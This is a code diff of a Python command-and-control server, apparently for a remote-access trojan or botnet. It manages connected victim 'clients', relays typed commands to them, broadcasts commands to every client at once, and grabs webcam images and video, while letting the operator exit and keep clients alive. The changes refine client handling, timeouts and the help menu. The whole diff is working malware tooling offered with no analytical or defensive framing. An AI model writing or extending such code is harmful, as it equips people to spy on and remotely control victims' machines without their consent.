@@ -92,6 +92,7 @@ class Server(threading.Thread):
             'back'          :   self.background_client,
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
+            'exit'          :   self.quit_server,
             'quit'          :   self.quit_server,
             'webcam'        :   self.webcam_client,
 	    'sendall'	    :   self.sendall_clients,
@@ -301,12 +302,12 @@ class Server(threading.Thread):
                 cv2.destroyAllWindows()
                 client.lock.set()
         elif mode == 'image':
-            self.send_client('webcam image')
-            result = self.recv_client()
+            self.send_client('webcam image', client.name)
+            result = self.recv_client(client.name)
             return result
         elif mode == 'video':
-            self.send_client('webcam video')
-            result = self.recv_client()
+            self.send_client('webcam video', client.name)
+            result = self.recv_client(client.name)
             return result
         return client.run()
     
@@ -355,7 +356,7 @@ class Server(threading.Thread):
             self.current_client = self.clients[int(client_id)]
             if not self.current_client.lock.is_set():
                 self.current_client.lock.set()
-            self._print('\nClient {} selected\n'.format(client_id))
+            self._print('\n\nClient {} selected'.format(client_id))
         self._return()
 
     def background_client(self):
@@ -376,23 +377,25 @@ class Server(threading.Thread):
         if int(client_id) not in self.clients:
             self._error('Invalid Client ID')
         else:
-            client = self.clients[int(client_id)]
+            client = self.clients.pop(int(client_id), None)
+            client.lock.clear()
+            del client
             if not self.current_client:
-                self._print('Client {} disconnected'.format(client.name))
-                del client
+                self.lock.clear()
+                self._print('Client {} disconnected'.format(client_id))
                 self.lock.set()
                 return self.run()
             elif int(client_id) != self.current_client.name:
                 self.current_client.lock.clear()
-                self._print('Client {} disconnected'.format(client.name))
-                del client
+                self._print('Client {} disconnected'.format(client_id))
                 self.current_client.lock.set()
                 return self.current_client.run()
             else:
-                self._print('Client {} disconnected'.format(client.name))
-                del client
-                return self.current_client.run()
-
+                self.lock.clear()
+                self._print('Client {} disconnected'.format(client_id))
+                self.lock.set()
+                return self.run()
+            
     def kill_client(self, client_id):
         if int(client_id) in self.clients:
             client = self.clients.get(int(client_id))
@@ -411,6 +414,7 @@ class Server(threading.Thread):
         try:
             for client in self.get_clients():
                 try:
+                    client.conn.settimeout(0.5)
                     self.send_client('standby', client.name)
                 except: pass
         finally:
@@ -452,13 +456,13 @@ class Server(threading.Thread):
     def usage(self):
         print
         print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
-        print(self._text_color + colorama.Style.BRIGHT   + '    command <argument>      ' + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + colorama.Fore.WHITE + ' descripton')
+        print(self._text_color + colorama.Style.BRIGHT   + '    command <argument>      ' + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' descripton')
         print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
-        print(self._text_color + self._text_style+ '    back                    ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Deselect current client')
-        print(self._text_color + self._text_style+ '    quit                    ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Exit server and keep clients alive')
-        print(self._text_color + self._text_style+ '    usage                   ' + colorama.Fore.YELLOW + '|' + self._text_color + ' display usage help for server commands')
+        print(self._text_color + self._text_style+ '    back                    ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Push current client to background')
         print(self._text_color + self._text_style+ '    clients                 ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List connected clients')
         print(self._text_color + self._text_style+ '    client <id>             ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Connect to a client')
+        print(self._text_color + self._text_style+ '    kill <id>               ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Remove client from connection pool')
+        print(self._text_color + self._text_style+ '    exit/quit               ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Exit server and keep clients alive')
         print(self._text_color + self._text_style+ '    sendall <command>       ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Send command to all clients')
         print(self._text_color + self._text_style+ '    settings <options>      ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Edit color/style settings')
         print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
@@ -509,47 +513,45 @@ class ConnectionHandler(threading.Thread):
         self.conn.setblocking(True)
 
     def _prompt(self, data):
-        try:
-            return raw_input(server._prompt_color + server._prompt_style + data)
-        except ValueError as e:
-             self._error("client prompt failed with error: '{}'".format(str(e)))
+        return raw_input(server._prompt_color + server._prompt_style + str(data))
              
     def _error(self, data):
-        try:
-            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.WHITE + 'Error: ' + colorama.Style.DIM + data + '\n')
-        except ValueError as e:
-            print("client error failed with error: '{}'".format(str(e)))
+        print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.WHITE + 'Error: ' + colorama.Style.DIM + str(data) + '\n')
 
     def run(self):
         while True:
-            if server.exit_status:
-                break
-            if self.id:
-                self.lock.wait()
-            data = ''
-            method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
-            if 'prompt' in method:
-                self.prompt = data.format(self.name)
-                command = self._prompt(self.prompt)
-                cmd, _, action = command.partition(' ')
-                if cmd in server.commands:
-                    result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
-                    if result:
-                        server._print(result)
-                    continue
+            try:
+                if server.exit_status:
+                    break
+                if self.id:
+                    self.lock.wait()
+                data = ''
+                method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
+                if 'prompt' in method:
+                    self.prompt = data.format(self.name)
+                    command = self._prompt(self.prompt)
+                    cmd, _, action = command.partition(' ')
+                    if cmd in server.commands:
+                        result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
+                        if result:
+                            server._print(result)
+                        continue
+                    else:
+                        server.send_client(command, self.name)
+                elif 'start' in method:
+                    self.info  = json.loads(data)
+                    self.id    = server.add_to_db(self.name)
                 else:
-                    server.send_client(command, self.name)
-            elif 'start' in method:
-                self.info  = json.loads(data)
-                self.id    = server.add_to_db(self.name)
-            else:
-                if data:
-                    server._print(data)
-            self.prompt = None
+                    if data:
+                        server._print(data)
+                self.prompt = None
+            except Exception as e:
+                self._error(str(e))
+                break
         self.lock.clear()
-        server.remove_client(self.name)
-        server.current_client = None
         server.lock.set()
+        server.current_client = None
+        server.remove_client(self.name)
         server.run()
          
 
